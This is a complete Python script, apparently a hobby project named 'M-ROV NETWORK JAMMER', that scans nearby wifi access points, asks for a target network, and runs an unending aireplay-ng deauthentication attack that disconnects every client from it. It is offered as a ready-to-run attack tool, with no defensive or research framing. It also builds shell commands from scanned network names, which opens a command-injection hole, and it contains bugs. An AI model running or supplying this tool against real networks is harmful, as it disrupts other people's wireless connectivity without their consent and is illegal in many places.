import subprocess 
import logging
import os
import re
import csv

#____________________________________________LOGGING___SETTINGS__________________________________________________________________________________#

#Configuring the logger
logging.basicConfig(filename="./logs/jam.log", 
	            format='%(asctime)s %(message)s', 
	            filemode='w') 

#Creating an object 
logger=logging.getLogger() 

#Setting the threshold of logger to DEBUG 
logger.setLevel(logging.DEBUG) 

#_________________________________________________________________________________________________________________________________________________#

#______________________________________________CONFIGURATION______________________________________________________________________________________#

#General configuration
version = "1.0"                                                 # version no displayed in title
name = "M-ROV NETWORK JAMMER"                                   # name displayed in title

#Wifi configurations
interface_name = "wlan0"
interface_in_monitor_mode = "wlan0mon"
AP_file_name = "AP_file"                                        # csv file in which output of airodump-ng command is stored

#Appearance
cell_width = 20                                              # width of each cell in table
table_width = ( cell_width * 3 ) + 4                            # width of the table as a whole


#______________________________________________TITLE_TEXT_________________________________________________________________________________________#

def title_text(version , name):
  print("*" * table_width)
  title = name + " " + version
  print(title.center(table_width))
  print("*" * table_width) 
  print('\n\n')
#_________________________________________________________________________________________________________________________________________________#

#______________________________________________START_MONITORING___________________________________________________________________________________#

def start_adapter(interface_name):

  logger.info("entered function start_adapter()")

  logger.info("Started airmon-ng")
  airmon = subprocess.Popen(["airmon-ng","start",interface_name],stdout = subprocess.PIPE , stderr = subprocess.PIPE)
  stdout,stderr = airmon.communicate()
  
  logger.info("Started airmon-ng check kill")
  check_kill = subprocess.Popen(["airmon-ng","check","kill"],stdout = subprocess.PIPE , stderr = subprocess.PIPE)
  c_stdout,c_stderr = check_kill.communicate()

  print("Note : Wifi Card is currently in MonitorMode")

  logger.info("Exited from function start_adapter()")

#_________________________________________________________________________________________________________________________________________________#
#______________________________________________STOP_MONITORING____________________________________________________________________________________#

def stop_adapter(interface_in_monitor_mode):

  print("\n\n")	
  logger.info("entered function stop_adapter()")

  stop_mon = subprocess.Popen(["airmon-ng","stop",interface_in_monitor_mode],stdout = subprocess.PIPE, stderr = subprocess.PIPE)
  sm_stdout,sm_stderr = stop_mon.communicate()
  logger.info("stopped monitoring successfully")
  print("Note : Wifi Card exited from Monitor mode")

  stop_mon1 = subprocess.Popen(["ifconfig","interface_name","up"],stdout = subprocess.PIPE, stderr = subprocess.PIPE)
  sm1_stdout,sm1_stderr = stop_mon1.communicate()
  logger.info("COMM :executing ifconfig wlan0 up")
  print("Note : Reverting Wifi Adapter to its original state")

  stop_mon2 = subprocess.Popen(["service","network-manager","restart"],stdout = subprocess.PIPE, stderr = subprocess.PIPE)
  sm2_stdout,sm2_stderr = stop_mon2.communicate()
  logger.info("COMM : executing service network manager restart")
  print("Note : Reverting Wifi Adapter to its original state")

  logger.info("Exited from function stop_adapter")

#_________________________________________________________________________________________________________________________________________________#
#______________________________________________START JAMMING______________________________________________________________________________________#
def start_jam(interface_in_monitor_mode):
	
  logger.info("Entered function start_jam()")

  command = "xterm -geometry -500+100 -T \"please wait for 5 second\" -e \"timeout 5 airodump-ng -w AP_file --output-format csv --write-interval 1   " + interface_in_monitor_mode +"\""
  logger.info("COMM :timeout 5s executing airodump-ng wlan0mon")
  os.system(command)
  
  #reading output from csv file
  fields = []
  rows = []

  with open(AP_file_name+"-01.csv", 'r') as csvfile: 
    # creating a csv reader object 
    csvreader = csv.reader(csvfile) 
      
    # extracting field names through first row 
    fields = csvreader.next()
    fields = csvreader.next() 

  
    # extracting each data row one by one 
    for row in csvreader: 
      rows.append(row) 
  
   
  print('\nWifi Access Points are vulnerable to jamming are :- \n') 
  # printing the field names 
  #print(fields[0])
  #print(fields[3])
  #print(fields[13])
  print('-'*table_width)
  print('|%s|%s|%s|'%(fields[13].center(cell_width),fields[3].center(cell_width),fields[0].center(cell_width)))
  print('-'*table_width)

  wireless_APs = []                #A list which stores all wireless APs located nearby

  try:
    for row in rows: 
      if(len(row)>0 and row[0] != 'Station MAC'):
        bssid = row[0]
        channel = row[3]
        essid = row[13]
        wireless_AP = [essid,channel,bssid]  
        print('|%s|%s|%s|'%(essid.center(cell_width),channel.center(cell_width),bssid.center(cell_width)))
        print('-'*table_width)
        wireless_APs.append(wireless_AP)
      else:
        break	
      
  except IndexError as e:
    logger.info(e)
  logger.info("Wireless AP's found are")	
  logger.info(wireless_APs)	
  os.system("rm " + AP_file_name + "-01.csv")
  logger.info("removed csv file ")

  essid=raw_input("\n\nEnter the name of the AccessPoint to be jammed (ESSID) >> ")
  desired_router = " "
  logger.info("routers found are:-")
  router_found = 0
  for router in wireless_APs:
    logger.info(router)
    logger.info(router[0])
    essid1 = str(router[0])
    essid1 = essid1.lstrip(' ')
    essid1 = essid1.rstrip(' ')
    channel1 = str(router[1])
    bssid1 = str(router[2])
    if essid == essid1:
      router_found = 1
      logger.info("desired router located")
      desired_router = router
      logger.info(router)
      print("\n\nLocking %s communicating on channel %s with BSSID %s \n\n" %(desired_router[0],desired_router[1],desired_router[2]))
      break
  if router_found == 0:
    print("\n\nError!! : Could not find wireless AP with ESSID %s"%(essid))		  
    logger.info(essid + "is chosen to be jammed")
  
  else:
    logger.info("locking airodump onto given ap")
    command = "xterm -geometry -500+100 -T 'locking channel " + desired_router[1] + "' -e ' timeout 5 airodump-ng --bssid " + desired_router[2] + " -c " + desired_router[1] + " " + interface_in_monitor_mode + " '"
    os.system(command)
    print("\ntarget locked successfullly")

    print("deauthenticating all clients from the AP (press ctrl + C to exit)")
    command = "xterm -geometry -500+100 -T 'deauthenticating all users from " + desired_router[0] + " (press ctrl+c to stop)' -e 'aireplay-ng --deauth 0 -a " + desired_router[2] + " " + interface_in_monitor_mode +  " '"
    os.system(command)
    logger.info("\n deauthenticating all clients")

  logger.info("Exited function start_jam()")
#_________________________________________________________________________________________________________________________________________________#


os.system("clear")
title_text(version,name)
start_adapter(interface_name)
start_jam(interface_in_monitor_mode)
stop_adapter(interface_in_monitor_mode)
